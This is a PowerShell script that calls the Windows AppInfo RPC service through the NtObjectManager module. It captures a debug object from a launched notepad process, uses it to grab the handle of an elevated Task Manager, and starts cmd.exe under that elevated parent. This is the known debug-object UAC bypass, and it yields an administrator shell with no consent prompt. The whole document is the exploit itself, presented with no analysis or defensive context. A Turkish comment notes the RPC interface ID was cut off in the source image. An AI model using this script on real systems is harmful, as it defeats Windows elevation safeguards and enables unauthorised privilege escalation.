# Use the code below this line to Install Module NtObjectManager which is needed to run this code
# Install-Module "NtObjectManager" -Scope CurrentUser
Import-Module NtObjectManager -ErrorAction Stop
Add-Type -Path ".\NtApiDotNet.dll"
Get-Command Get-RpcClient -ErrorAction Stop
Get-Command Connect-RpcClient -ErrorAction Stop
$rpc = (Get-RpcServer "c:\windows\system32\appinfo.dll" | Select-RpcServer -InterfaceId "201e") # Not: Arayüz ID'sinin devamı görselde kesilmiştir
$xmlString = Get-Content .\names.xml -Raw
Set-RpcServerName $rpc $xmlString
$client = $rpc | Get-RpcClient
Connect-RpcClient $client

function Start-Uac {
    Param(
        [Parameter(Mandatory, Position = 0)]
        [string]$Executable,
        [switch]$RunAsAdmin
    )

    $CreateFlags = [NtApiDotNet.Win32.CreateProcessFlags]::DebugProcess -bor `
        [NtApiDotNet.Win32.CreateProcessFlags]::UnicodeEnvironment
    $StartInfo = $client.New.APP_STARTUP_INFO()

    $result = $client.RAILaunchAdminProcess($Executable, $Executable, `
        [int]$RunAsAdmin.IsPresent, [int]$CreateFlags, `
        "C:\", "WinSta0\Default", $StartInfo, 0, -1)
    
    if ($result.retval -ne 0) {
        $ex = [System.ComponentModel.Win32Exception]::new($result.retval)
        throw $ex
    }

    $h = $result.ProcessInformation.ProcessHandle.Value
    Get-NtObjectFromHandle $h -OwnsHandle
}

$p = Start-Uac "c:\windows\system32\notepad.exe"
$dbg = Get-NtDebug -Process $p
Stop-NtProcess $p
Remove-NtDebugProcess $dbg -Process $p

$p = Start-Uac "c:\windows\system32\taskmgr.exe" -RunAsAdmin
$ev = Start-NtDebugWait -Seconds 0 -DebugObject $dbg
$h = [IntPtr]-1
$new_p = Copy-NtObject -SourceProcess $ev.Process -SourceHandle $h
Remove-NtDebugProcess $dbg -Process $new_p
New-Win32Process "cmd.exe" -ParentProcess $new_p -CreationFlags NewConsole
